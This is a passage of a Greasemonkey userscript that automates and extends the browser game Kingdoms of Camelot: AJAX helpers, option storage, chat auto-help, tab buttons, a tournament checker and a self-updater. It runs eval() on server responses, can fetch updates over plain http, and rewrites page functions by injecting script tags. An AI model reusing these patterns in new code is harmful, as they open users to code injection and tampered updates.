	city.Def62Time = ((city.wallLevel > 1 && city.blacksmithLevel > 1 && city.loggingLevel > 1)?(60/dsf):0);
}
function getCityIdFromXY(x, y) {
	for(var i=0; i<Cities.numCities; i++) {
		if (Cities.cities[i].x == x && Cities.cities[i].y == y) {
			return Cities.cities[i].id;
		}
	}
	return -1;
}
function setCities(){
var il = unsafeWindow.itemlist;
  for (var i=1101; i < 1115; i++)
  crestname[i] = il['i'+i].name
  getResearchLevels();
  Cities.numCities = Seed.cities.length;
  Cities.cities = [];
  Cities.byID = {};
  for (i=0; i<Cities.numCities; i++){
    city = {};
    city.idx = i;
    city.id = parseInt(Seed.cities[i][0]);
    city.name = Seed.cities[i][1];
    city.x = parseInt(Seed.cities[i][2]);
    city.y = parseInt(Seed.cities[i][3]);
    city.tileId = parseInt(Seed.cities[i][5]);
    city.provId = parseInt(Seed.cities[i][4]);
	getTroopDefTrainEstimates('city'+ city.id);
    Cities.cities[i] = city;
    Cities.byID[Seed.cities[i][0]] = city;
  }
}
function dialogRetry (errMsg, seconds, onRetry, onCancel, errCode){
  seconds = parseInt(seconds);
  var pop = new CPopup ('pbretry', 0, 0, 746, 100, true);
  pop.centerMe(mainPop.getMainDiv());
  pop.getTopDiv().innerHTML = '<div class=pdxErrorPopup><CENTER>'+culang.error+'</center></div>';
  pop.getMainDiv().innerHTML = '<CENTER><BR><FONT COLOR=#550000><B>'+culang.errorrpt+':</b></font><BR><BR><DIV id=paretryErrMsg></div>\
      <BR><BR><B>'+culang.arefresh+' in <SPAN id=paretrySeconds></b></span> '+culang.seconds+'!<BR><BR><INPUT id=paretryCancel type=submit value="'+culang.Hcancel+' '+culang.repeat+'" \>';
  document.getElementById('paretryCancel').addEventListener ('click', doCancel, false);
  pop.show(true);

  if(errCode && unsafeWindow.g_js_strings.errorcode['err_'+errCode])
  document.getElementById('paretryErrMsg').innerHTML = unsafeWindow.g_js_strings.errorcode['err_'+errCode];
  else
  document.getElementById('paretryErrMsg').innerHTML = errMsg;
  
  document.getElementById('paretrySeconds').innerHTML = seconds;
  var rTimer = setTimeout (doRetry, seconds*1000);
  countdown ();

  function countdown (){
    document.getElementById('paretrySeconds').innerHTML = seconds--;
    if (seconds > 0)
      cdTimer = setTimeout (countdown, 1000);
  }
  function doCancel(){
    clearTimeout (rTimer);
    clearTimeout (cdTimer);
    pop.destroy();
    onCancel ();
  }
  function doRetry (){
    clearTimeout (rTimer);
    clearTimeout (cdTimer);
    pop.show(false);
    onRetry();
  }
}
function implodeUrlArgs (obj){
  var a = [];
  for (var k in obj)
    a.push (k +'='+ encodeURI(obj[k]) );
  return a.join ('&');
}

function addUrlArgs (url, args){
  if (!args)
    return url;
  if (url.indexOf('?') < 0)
    url += '?';
  else if (url.substr(url.length-1) != '&')
    url += '&';
  if (matTypeof(args == 'object'))
    return url + implodeUrlArgs (args);
  return url + args;
}

function AjaxRequest (url, opts){
  var headers = {
    'X-Requested-With': 'XMLHttpRequest',
    'X-Prototype-Version': '1.6.1',
    'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'
  };
  var ajax = null;

if (DEBUG_TRACE_AJAX) logit ("AJAX: "+ url +"\n" + inspect (opts, 3, 1));

  if (window.XMLHttpRequest)
    ajax=new XMLHttpRequest();
  else
    ajax=new ActiveXObject("Microsoft.XMLHTTP");

  if (opts.method==null || opts.method=='')
    method = 'GET';
  else
    method = opts.method.toUpperCase();

  if (method == 'POST'){
    headers['Content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
  } else if (method == 'GET'){
    addUrlArgs (url, opts.parameters);
  }

  ajax.onreadystatechange = function(){ //  ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete']; states 0-4
    if (ajax.readyState==4) {
      if (ajax.status >= 200 && ajax.status < 305)
        if (opts.onSuccess) opts.onSuccess(ajax);
      else
        if (opts.onFailure) opts.onFailure(ajax);
    } else {
      if (opts.onChange) opts.onChange (ajax);
    }
  }

  ajax.open(method, url, true);   // always async!

  for (var k in headers)
    ajax.setRequestHeader (k, headers[k]);
  if (matTypeof(opts.requestHeaders)=='object')
    for (var k in opts.requestHeaders)
      ajax.setRequestHeader (k, opts.requestHeaders[k]);

  if (method == 'POST'){
    var a = [];
    for (k in opts.parameters)
      a.push (k +'='+ opts.parameters[k] );
    ajax.send (a.join ('&'));
  } else               {
    ajax.send();
  }
}

function MyAjaxRequest (url, o, noRetry){
if (DEBUG_TRACE) logit (" 0 myAjaxRequest: "+ url +"\n" + inspect (o, 2, 1));
  var opts = unsafeWindow.Object.clone(o);
  var wasSuccess = o.onSuccess;
  var wasFailure = o.onFailure;
  var retry = 0;
  var delay = 5;
  var noRetry = noRetry===true?true:false;
  opts.onSuccess = mySuccess;
  opts.onFailure = myFailure;

if (DEBUG_TRACE) logit (" 1a myAjaxRequest: "+ url +"\n" + inspect (o, 2, 1));
  new AjaxRequest(url, opts);
  return;

  function myRetry(){
    ++retry;
    new AjaxRequest(url, opts);
    delay = delay * 1.25;
  }

  function myFailure(){
    var o = {};
if (DEBUG_TRACE) logit ("myAjaxRequest.myFailure(): "+ inspect(rslt, 1, 1));
    o.ok = false;
    o.errorMsg = "AJAX Communication Failure";
    wasFailure (o);
  }

  function mySuccess (msg){
    var rslt = eval("("+ msg.responseText +")");
   // var rslt = eval("(" + msg.responseText + ")");
    var x;
    if (rslt.ok){
if (DEBUG_TRACE) logit (" 1b myAjaxRequest.mySuccess(): "+ inspect(rslt, 1, 1));
      rslt.errorMsg = null;   ///// !!!!!!!!!!!!!  ************
      if (rslt.updateSeed)
        unsafeWindow.update_seed(rslt.updateSeed);
      wasSuccess (rslt);
      return;
    }
if (DEBUG_TRACE) logit (" 1b myAjaxRequest.mySuccess() !ok : "+ inspect(rslt, 3, 1));
    rslt.errorMsg = unsafeWindow.printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null));
    //if ( (x = rslt.errorMsg.indexOf ('<br><br>')) > 0)
      //rslt.errorMsg = rslt.errorMsg.substr (0, x-1);
    if (!noRetry && (rslt.error_code==0 ||rslt.error_code==8 || rslt.error_code==1 || rslt.error_code==3)){
      dialogRetry (rslt.errorMsg, delay, function(){myRetry()}, function(){wasSuccess (rslt)}, rslt.error_code);
    } else {
      wasSuccess (rslt);
    }
  }
}
function distance (d, f, c, e) {
  var a = 750;
  var g = a / 2;
  var b = Math.abs(c - d);
  if (b > g)
    b = a - b;
  var h = Math.abs(e - f);
  if (h > g)
    h = a - h;
  return Math.round(100 * Math.sqrt(b * b + h * h)) / 100;
};

var myServerId = null;
function getServerId() {
  if (myServerId == null){
    var m=/^[a-zA-Z]+([0-9]+)\./.exec(document.location.hostname);
    if (m)
      myServerId = m[1];
    else
      myServerId = '??';
  }
  return myServerId;
    return m[1];
  return '';
}

function logit (msg){
  var now = new Date();
  GM_log (getServerId() +' @ '+ now.toTimeString().substring (0,8) +'.' + now.getMilliseconds() +': '+  msg);
}
var debugWin = {
  popDebug : null,
  dbDefaultNot : 'tech,tutorial,items,quests,wilderness,wildDef,buildings,knights,allianceDiplomacies,appFriends,players',
  dbSelect : {},

  doit : function (){
    var t = debugWin;

    function syncBoxes (){
      var div = document.getElementById('dbpoplist');
      for (var i=0; i<div.childNodes.length; i++){
        if (div.childNodes[i].type && div.childNodes[i].type=='checkbox'){
          var name=div.childNodes[i].name.substr(6);
          div.childNodes[i].checked = t.dbSelect[name];
        }
      }
    }
    function clickedAll (){
      for (var k in t.dbSelect)
        t.dbSelect[k] = true;
      syncBoxes();
    }
    function clickedNone (){
      for (var k in t.dbSelect)
        t.dbSelect[k] = false;
      syncBoxes();
    }
    function clickedDefaults (){
      for (k in t.dbSelect)
        t.dbSelect[k] = true;
      var not = t.dbDefaultNot.split(',');
      for (var i=0; i<not.length; i++)
        t.dbSelect[not[i]] = false;
      syncBoxes();
    }
    function clickedShow (){
      var now = new Date();
      var myseed = unsafeWindow.Object.clone (Seed);
      var div = document.getElementById('dbpoplist');
      for (var i=0; i<div.childNodes.length; i++){
        if (div.childNodes[i].type && div.childNodes[i].type=='checkbox'){
          var name=div.childNodes[i].name.substr(6);
          if (!div.childNodes[i].checked)
            delete myseed[name];
        }
      }
      WinLog.write ("seed @ "+ unixTime()  +" ("+ now +")\n\n"+ inspect (myseed, 8, 1));
      myseed=null;
    }

    function clickedShowScripts (){
      var scripts = document.getElementsByTagName('script');
      for (var i=0; i<scripts.length; i++){
        if (scripts[i].src!=null && scripts[i].src!='')
          WinLog.write ('<A TARGET=_tab HREF="'+ scripts[i].src +'">'+ scripts[i].src +'</a>');
      }
    }

    if (t.popDebug == null){
      t.popDebug = new CPopup ('db', 0, 0, 746, 100, true);
      t.popDebug.getTopDiv().innerHTML = 'DEBUG';
      t.popDebug.getMainDiv().innerHTML = '<DIV><INPUT type=submit id=dbsuball value=ALL> &nbsp; <INPUT type=submit id=dbsubnone value=NONE> &nbsp; \
        <INPUT type=submit id=dbdefaults value=DEFAULTS> &nbsp; <INPUT type=submit id=dbsubdo value=SHOW> &nbsp; <INPUT type=submit id=dbsubscripts value=SCRIPTS></div>\
        <DIV id=dbpoplist style="max-height:750px; height:600px; overflow-y:auto"></div>';
      var div = document.getElementById('dbpoplist');
      for (var k in Seed)
        t.dbSelect[k] = true;
      var not = t.dbDefaultNot.split(',');
      for (var i=0; i<not.length; i++)
        t.dbSelect[not[i]] = false;
      var m = [];
      for (k in t.dbSelect){
        m.push ('<INPUT type=checkbox ');
        m.push ('name="dbpop_');
        m.push (k);
        m.push ('"> &nbsp; ');
        m.push (k);
        m.push ('<BR>');
      }
      div.innerHTML = m.join ('');
      document.getElementById('dbsuball').addEventListener('click', clickedAll, false);
      document.getElementById('dbsubnone').addEventListener('click', clickedNone, false);
      document.getElementById('dbdefaults').addEventListener('click', clickedDefaults, false);
      document.getElementById('dbsubdo').addEventListener('click', clickedShow, false);
      document.getElementById('dbsubscripts').addEventListener('click', clickedShowScripts, false);
      syncBoxes();
    }
    t.popDebug.show (true);
  },
}
function saveAutoTrainOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('AutoTrainOptions_' +serverID, JSON2.stringify(AutoTrainOptions));}, 0);
}
function saveColors (){
  var serverID = getServerId();
  GM_setValue ('Colors_'+serverID, JSON2.stringify(Colors));
}
function saveChatOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('ChatOptions_'+serverID, JSON2.stringify(ChatOptions));}, 0);
}
function saveOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('Options2_'+serverID, JSON2.stringify(Options));}, 0);
}
function savePDXCountOpt (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('PDXCountOpt_'+serverID, JSON2.stringify(PDXCountOpt));}, 0);
}
function saveGlobalOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('GlobalOptions_', JSON2.stringify(GlobalOptions));}, 0);
}
function saveLangOptions (){
setTimeout (function (){GM_setValue ('LangOptions_', JSON2.stringify(LangOptions));}, 0);
}
function saveCrestOptions (){
  var serverID = getServerId();
 setTimeout (function (){GM_setValue ('CrestOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(CrestOptions));}, 0);
}
function saveStyleOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('StyleOptions_'+serverID, JSON2.stringify(StyleOptions));}, 0);
}
function saveWallTrainOptions (){
var serverID = getServerId();
	GM_setValue ('WallTrainOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(WallTrainOptions));
}
function saveAttackOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('AttackOptions_'+serverID, JSON2.stringify(AttackOptions));}, 0);
}
function readOptions (){
  var serverID = getServerId();
  s = GM_getValue ('Options2_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          Options[k][kk] = opts[k][kk];
      else
        Options[k] = opts[k];
    }
  }
}
function readStyleOptions (){
  var serverID = getServerId();
  s = GM_getValue ('StyleOptions_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          StyleOptions[k][kk] = opts[k][kk];
      else
        StyleOptions[k] = opts[k];
    }
  }
}
function readPDXCountOpt (){
  var serverID = getServerId();
  s = GM_getValue ('PDXCountOpt_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          PDXCountOpt[k][kk] = opts[k][kk];
      else
        PDXCountOpt[k] = opts[k];
    }
  }
}
function readWallTrainOptions (){
var serverID = getServerId();
	s = GM_getValue ('WallTrainOptions_' + Seed.player['name'] + '_' +serverID);
	if (s != null){
		opts = JSON2.parse (s);
		for (k in opts){
			if (WallTrainOptions[k] != undefined) {
				if (matTypeof(opts[k]) == 'object') {
					for (kk in opts[k])
						if (WallTrainOptions[k][kk] != undefined)
							WallTrainOptions[k][kk] = opts[k][kk];
				} else
					WallTrainOptions[k] = opts[k];
			}
		}
	}
}
function readGlobalOptions (){
  s = GM_getValue ('GlobalOptions_');
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          GlobalOptions[k][kk] = opts[k][kk];
      else
        GlobalOptions[k] = opts[k];
    }
  }
}
function readColors (){
  var serverID = getServerId();
  s = GM_getValue ('Colors_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts)
      Colors[k] = opts[k];
  }else{
	s = GM_getValue ('Colors');
	if (s != null){
		opts = JSON2.parse (s);
		for (k in opts)
		  Colors[k] = opts[k];
	}
  }
}
function readChatOptions (){
  var serverID = getServerId();
  s = GM_getValue ('ChatOptions_'+serverID, '[]');
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          ChatOptions[k][kk] = opts[k][kk];
      else
        ChatOptions[k] = opts[k];
    }
  }
}
function readAttackOptions (){
  var serverID = getServerId();
  s = GM_getValue ('AttackOptions_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          AttackOptions[k][kk] = opts[k][kk];
      else
        AttackOptions[k] = opts[k];
    }
  }
}
function readCrestOptions (){
  var serverID = getServerId();
  s = GM_getValue ('CrestOptions_' + Seed.player['name'] + '_' +serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          CrestOptions[k][kk] = opts[k][kk];
      else
        CrestOptions[k] = opts[k];
    }
  }
}
// function readAutoTrainOptions (){
  // var serverID = getServerId();
  // s = GM_getValue ('TrainingOptions_' + Seed.player['name'] + '_' +serverID);
  // if (s != null){
    // opts = JSON2.parse (s);
    // for (k in opts){
      // if (matTypeof(opts[k]) == 'object')
        // for (kk in opts[k])
          // AutoTrainOptions[k][kk] = opts[k][kk];
      // else
        // AutoTrainOptions[k] = opts[k];
    // }
  // }
// }

function readAutoTrainOptions (){
  var serverID = getServerId();
  s = GM_getValue ('AutoTrainOptions_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){

        AutoTrainOptions[k] = opts[k];
    }
  }
}

var myServers = {   // incomplete, untested
  serverlist : null,

  get : function (notify){
    if (myServers.serverlist){
      notify (myServers.serverlist);
      return;
    }
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);

    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/myServers.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function(rslt) {
logit (inspect (rslt, 3, 1));
        if (notify)
          notify (myServers.serverlist);
      },
      onFailure: function(rslt) {
      }
    });
  },
};

function AddMainTabLink(text, eventListener, mouseListener) {
  var b = createButton (text);
  b.className='tab';
  b.id = 'ptBoite2';
  
  var a = createButton (text);
  a.className='tab';
  var tabs=document.getElementById('main_engagement_tabs');
  if(!tabs) {
    tabs=document.getElementById('topnav_msg');
    if (tabs)
      tabs=tabs.parentNode;
  }
  if (tabs) {
    var e = tabs.parentNode;
    var gmTabs = null;
    for (var i=0; i<e.childNodes.length; i++){
      var ee = e.childNodes[i];
      if (ee.tagName && ee.tagName=='DIV' && ee.className=='tabs_engagement' && ee.id!='main_engagement_tabs'){
        gmTabs = ee;
        break;
      }
    }
    if (gmTabs == null){
      gmTabs = document.createElement('div');
      gmTabs.className='tabs_engagement';
      tabs.parentNode.insertBefore (gmTabs, tabs);
	  gmTabs.style.padding= '20px 0px 0px 15px';
      gmTabs.style.whiteSpace='nowrap';
	  gmTabs.style.width='735px';
      gmTabs.lang = 'en_PB';
    }
    gmTabs.appendChild(a);
    a.addEventListener('click',eventListener, false);
    if (mouseListener != null)
      a.addEventListener('mousedown',mouseListener, true);
    return a;
  }
  return null;
}
function AddSubTabLink(text, eventListener, id) {
  var a = createButton (text,'botbutton');
  a.className='tab';
  var tabs=document.getElementById('main_engagement_tabs');
  if(!tabs) {
    tabs=document.getElementById('topnav_msg');
    if (tabs)
      tabs=tabs.parentNode;
  }
  if (tabs) {
    var e = tabs.parentNode;
    var gmTabs = null;
    for (var i=0; i<e.childNodes.length; i++){
      var ee = e.childNodes[i];
      if (ee.tagName && ee.tagName=='DIV' && ee.className=='tabs_engagement' && ee.id!='main_engagement_tabs'){
        gmTabs = ee;
        break;
      }
    }
    if (gmTabs == null){
      gmTabs = document.createElement('div');
      gmTabs.className='tabs_engagement';
      tabs.parentNode.insertBefore (gmTabs, tabs);
      gmTabs.style.whiteSpace='nowrap';
      gmTabs.style.width='735px';
      gmTabs.lang = 'en_PB';
    }
    gmTabs.appendChild(a);
    a.addEventListener('click',eventListener, false);
    if (id != null)
      a.id = id;
    return a;
  }
  return null;
}
function AddTowerTab(text, eventListener, id) {
  var a = createRedButton (text,'botbutton');
  a.className='tab';
  var tabs=document.getElementById('main_engagement_tabs');
  if(!tabs) {
    tabs=document.getElementById('topnav_msg');
    if (tabs)
      tabs=tabs.parentNode;
  }
  if (tabs) {
    var e = tabs.parentNode;
    var gmTabs = null;
    for (var i=0; i<e.childNodes.length; i++){
      var ee = e.childNodes[i];
      if (ee.tagName && ee.tagName=='DIV' && ee.className=='tabs_engagement' && ee.id!='main_engagement_tabs'){
        gmTabs = ee;
        break;
      }
    }
    if (gmTabs == null){
      gmTabs = document.createElement('div');
      gmTabs.className='tabs_engagement';
      tabs.parentNode.insertBefore (gmTabs, tabs);
      gmTabs.style.whiteSpace='nowrap';
      gmTabs.style.width='735px';
	  gmTabs.style.height='60px';
      gmTabs.lang = 'en_PB';
    }
    gmTabs.appendChild(a);
    a.addEventListener('click',eventListener, false);
    if (id != null)
      a.id = id;
    return a;
  }
  return null;
}
unsafeWindow.PTscout = function (x, y){
  setTimeout (function (){
    if (Options.hideOnGoto)
    hideMe ();
    document.getElementById('mapXCoor').value = x;
    document.getElementById('mapYCoor').value = y;
    unsafeWindow.reCenterMapWithCoor();
    unsafeWindow.changeview_map(document.getElementById('mod_views_map'));
    unsafeWindow.modal_attack(3,x,y);
  }, 0);
};
/************** ChatPane **********/
var ChatPane = {
    init : function(){
      var t = ChatPane;
     setInterval(t.HandleChatPane, 2500);
    },
 HandleChatPane : function() {
     var DisplayName = GetDisplayName();
     var AllianceChatBox=document.getElementById('mod_comm_list2');
  if(AllianceChatBox){
      var chatPosts = document.evaluate(".//div[contains(@class,'chatwrap')]", AllianceChatBox, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
       if(chatPosts){
         for (var i = 0; i < chatPosts.snapshotLength; i++) {
          thisPost = chatPosts.snapshotItem(i);
        if(Options.HelpRequest){
            var postAuthor = document.evaluate('.//*[@class="nm"]', thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
             if(postAuthor.snapshotItem(0)){
              var postAuthorName = postAuthor.snapshotItem(0).innerHTML;
            if(postAuthorName != DisplayName){
                 var helpAllianceLinks=document.evaluate(".//a[contains(@onclick,'claimAllianceChatHelp')]", thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
                if(helpAllianceLinks){
                   for (var j = 0; j < helpAllianceLinks.snapshotLength; j++) {
                    thisLink = helpAllianceLinks.snapshotItem(j);
                     var alreadyClicked = thisLink.getAttribute("clicked");
                    if(!alreadyClicked){
                    thisLink.setAttribute('clicked', 'true');
                    var myregexp = /(claimAllianceChatHelp\(.*\);)/;
                      var match = myregexp.exec(thisLink.getAttribute("onclick"));
                      if (match != null) {
                        onclickCode = match[0];
                      if(true){
                        DoUnsafeWindow(onclickCode);
                        }
                      }
                    }
                   }
                }
              }
            }
          } // Hide alliance requests in chat
          if(Options.DeleteRequest){
            var helpAllianceLinks=document.evaluate(".//a[contains(@onclick,'claimAllianceChatHelp')]", thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
            if(helpAllianceLinks){
               for (var j = 0; j < helpAllianceLinks.snapshotLength; j++) {
                 thisLink = helpAllianceLinks.snapshotItem(j);
                thisLink.parentNode.parentNode.parentNode.parentNode.parentNode.removeChild(thisLink.parentNode.parentNode.parentNode.parentNode);
              }
             } // Hide alliance reports in chat
					var myregexp1 = culang.myregexp1;
					var myregexp2 = culang.myregexp2;
					var myregexp3 = culang.myregexp3;
					var myregexp4 = culang.myregexp4;
					var myregexp5 = culang.myregexp5;
            if (thisPost.innerHTML.match(myregexp1) || thisPost.innerHTML.match(myregexp2) || thisPost.innerHTML.match(myregexp3) || thisPost.innerHTML.match(myregexp4)  || thisPost.innerHTML.match(myregexp5)) {
              thisPost.parentNode.removeChild(thisPost);
            }
          }
        }
       }
    }
    },

}

// UPDATER The following code is released under public domain. (copie from KoC Scripters)
function display_confirm(confirm_msg,ok_function,cancel_function){
    if(!confirm_msg){confirm_msg="";}
    
    var container_div = document.getElementById('modal_js_confirm');
    var div;
    if(!container_div) {
        container_div=document.createElement('div');
        container_div.id='modal_js_confirm';
        container_div.style.position='absolute';
        container_div.style.top='0px';
        container_div.style.left='0px';
        container_div.style.width='100%';
        container_div.style.height='1px';
        container_div.style.overflow='visible';
        container_div.style.zIndex=100000;
        
        div=document.createElement('div');
        div.id='modal_js_confirm_contents';
        div.style.zIndex=100000;
        div.style.backgroundColor='#eee';
        div.style.fontFamily='"lucida grande",tahoma,verdana,arial,sans-serif';
        div.style.fontSize='11px';
        div.style.textAlign='center';
        div.style.color='#333333';
        div.style.border='2px outset #666';
        div.style.padding='10px';
        div.style.position='relative';
        div.style.width='300px';
        div.style.height='100px';
        div.style.margin='300px auto 0px auto';
        div.style.display='block';
		
        container_div.appendChild(div);
        document.body.appendChild(container_div);
        
        div.innerHTML = '<div style="text-align:center"><div>'+confirm_msg+'</div><br/><div>'+culang.pressOK+'</div><br><button id="modal_js_confirm_ok_button">'+culang.actionGold2+'</button> <button id="modal_js_confirm_cancel_button">'+culang.cancel+'</button></div>';
        var ok_button = document.getElementById('modal_js_confirm_ok_button');
        ok_button.addEventListener('click',function() {
            if(ok_function && typeof(ok_function) == "function"){
           	 ok_function();
            }
            container_div.parentNode.removeChild(container_div);
        },false);
        var cancel_button = document.getElementById('modal_js_confirm_cancel_button');
        cancel_button.addEventListener('click',function() {
            if(cancel_function && typeof(cancel_function) == "function"){
            	cancel_function();
            }
            container_div.parentNode.removeChild(container_div);
        },false);
	}
}
var AutoUpdater_104137 = {
    id: 104137,
    days: 1,
    name: kocpower,
    version: Version,
	beta: GlobalOptions.pbupdatebeta,
	betaUrl : 'http://koc-power-pdx.googlecode.com/svn/trunk/koc_power_pdx.user.js',
    time: new Date().getTime(),
    call: function(response, secure) {
        GM_xmlhttpRequest({
            method: 'GET',
	    url: this.beta ? this.betaUrl : 'http'+(secure ? 's' : '')+'://userscripts.org/scripts/source/'+this.id+'.meta.js',
	    onload: function(xpr) {AutoUpdater_104137.compare(xpr, response);},
            onerror: function(xpr) {if (secure) AutoUpdater_104137.call(response, false);}
        });
    },
    enable: function() {
        GM_registerMenuCommand("Auto Update: "+this.name+" ", function() {
            GM_setValue('updated_104137', new Date().getTime()+'');
            AutoUpdater_104137.call(true, true)
        });
    },
    compareVersion: function(r_version, l_version) {
        var r_parts = r_version.split('.'),
            l_parts = l_version.split('.'),
            r_len = r_parts.length,
            l_len = l_parts.length,
            r = l = 0;
        for(var i = 0, len = (r_len > l_len ? r_len : l_len); i < len && r == l; ++i) {
            r = +(r_parts[i] || '0');
            l = +(l_parts[i] || '0');
        }
        return (r !== l) ? r > l : false;
    },
    compare: function(xpr,response) {
        this.xversion=/\/\/\s*@version\s+(.+)\s*\n/i.exec(xpr.responseText);
        this.xname=/\/\/\s*@name\s+(.+)\s*\n/i.exec(xpr.responseText);
        if ( (this.xversion) && (this.xname[1] == this.name) ) {
            this.xversion = this.xversion[1];
            this.xname = this.xname[1];
        } else {
            if ( (xpr.responseText.match("the page you requested doesn't exist")) || (this.xname[1] != this.name) ) {
            	//GM_setValue('updated_104137', 'off');
            }
            return false;
        }
        var updated = this.compareVersion(this.xversion, this.version);
        
        if ( updated ) {
			 display_confirm(''+culang.UDPdisplayconfirm+' '+this.xname+' '+culang.UDPdisplayconfirm2+'\n '+culang.UDPdisplayconfirm3+'',
                // Ok
                function(){
                    try { 
						location.href = AutoUpdater_104137.beta ? AutoUpdater_104137.betaUrl :  'http://userscripts.org/scripts/source/104137.user.js';
                    } catch(e) {}
                },
                // Cancel
                function(){
                    if ( AutoUpdater_104137.xversion ) {
                        if(confirm(''+culang.UDPturnoff+'')) {
                            //GM_setValue('updated_104137', 'off');
							GlobalOptions.pbupdate = false;
							GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
                            AutoUpdater_104137.enable();
                            alert(''+culang.UDPreenable+'');
                        }
                    }
                }
            );
                                      
        } else if (response){
        	alert(''+culang.UDPnoudp+' '+this.name);
        }
    },
    check: function(tf) {
        if (!tf){
            this.enable();
        } else {
            GM_registerMenuCommand(""+culang.UDPcheck+" "+this.name+" "+culang.UDPcheck2+" ", function() {
                GM_setValue('updated_104137', new Date().getTime()+'');
                AutoUpdater_104137.call(true, true)
            });
            if (+this.time > (+GM_getValue('updated_104137', 0) + 1000*60*60*24*this.days)) {
                GM_setValue('updated_104137', this.time+'');
                this.call(false, true);
            }
        }
    }
};
if (typeof(GM_xmlhttpRequest) !== 'undefined' && typeof(GM_updatingEnabled) === 'undefined') { // has an updater?
    try {
        AutoUpdater_104137.check(GlobalOptions.pbupdate);
    } catch(e) {
        AutoUpdater_104137.check(GlobalOptions.pbupdate);
    }
}
// END OF UPDATER
/**********************************************************************************/
var CalterUwFunc = function (funcName, findReplace) {
  var t = this;
  this.isEnabled = false;
  this.isAvailable = isAvailable;
  this.setEnable = setEnable;
  this.funcOld = null;
  this.funcNew = null;
  try {
    var x = funcName.split('.');
    var f = unsafeWindow;
    for (var i=0; i<x.length; i++)
      f = f[x[i]];
    this.funcOld = f;
    var rt = f.toString().replace ('function '+ funcName, 'function');
    for (var i=0; i<findReplace.length; i++){
      x = rt.replace(findReplace[i][0], findReplace[i][1]);
      if (x == rt)  // if not found
        return;
      rt = x;
    }
    this.funcNew = rt;
  } catch (err) {
  }

  function setEnable (tf){
    if (t.funcNew == null)
      return;
    if (t.isEnabled != tf){
      if (tf){
        var scr = document.createElement('script');    // <== need to remove on disable!!!
        scr.innerHTML = funcName +' = '+ t.funcNew;
        document.body.appendChild(scr);
        setTimeout ( function (){document.body.removeChild(scr);}, 500);
        t.isEnabled = true;
      } else {
      var x = funcName.split('.');
      var f = unsafeWindow;
      for (var i=0; i<x.length-1; i++)
        f = f[x[i]];
      f[x[x.length-1]] = this.funcOld;
        t.isEnabled = false;
      }
    }
  }
  function isAvailable (){
    if (t.funcNew == null)
      return false;
    return true;
  }
};

 var checkTournament = {
   init : function (){
    var f = checkTournament;
    f.e_eachMinute();
   },
   minuteTimer : null,
   e_eachMinute : function (){   
     var f = checkTournament;
     var now = unixTime();
     row = [];
     if (Options.enableCheckTournoi)  {
      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        params.format=2;
        params.tournyPos=0;
        new AjaxRequest(unsafeWindow.g_ajaxpath+"ajax/getLeaderboard.php"+unsafeWindow.g_ajaxsuffix, {  method:"post",  parameters:params,
       onSuccess:function(transport){
         var rslt=eval("("+transport.responseText+")");
         if(rslt.ok){
          if(rslt.data){
			document.getElementById('ptBoite2').innerHTML='<span style="color: #f66"><blink>'+culang.turn+'</blink></span>';
			var msg =""+culang.startTournament+"";
			setTimeout (function() {
			sendChat("/" + Seed.player.name + ' ' + msg);
			}, 5000);
	      Options.enableCheckTournoi = false;
	      saveOptions();
          }
          }
         }
        });
       f.minuteTimer = setTimeout (f.e_eachMinute, 600000);
     }
   },  
 }
 
function makeButton20 (label){
  var a = document.createElement('a');
  a.className = "button20 ptButton20";
  var s = document.createElement('span');
  s.innerHTML = label;
  a.appendChild (s);
  return a;
}
function createButton (label){
  var a=document.createElement('a');
  a.className='button20';
  a.innerHTML='<span style="color: #fff">'+ label +'</span>';
  return a;
}
function createRedButton (label,id){
  var a=document.createElement('a');
  a.className='button20';
  a.id = id;
  a.innerHTML='<span style="color: #F71F02">'+ label +'</span>';
  return a;
}
function strButton20 (label, tags){
  if (tags == null)
    tags = '';
  return ('<TABLE class=ptNoPad><TR><TD><A class="button20 ptButton20" '+ tags +'><SPAN>'+ label +'</span></a></td></tr></table>' );
}
function strButton14 (label, tags){
  if (tags == null)
    tags = '';
  return ('<A class="button14 ptButton20" '+ tags +'><SPAN>'+ label +'</span></a>' );
}
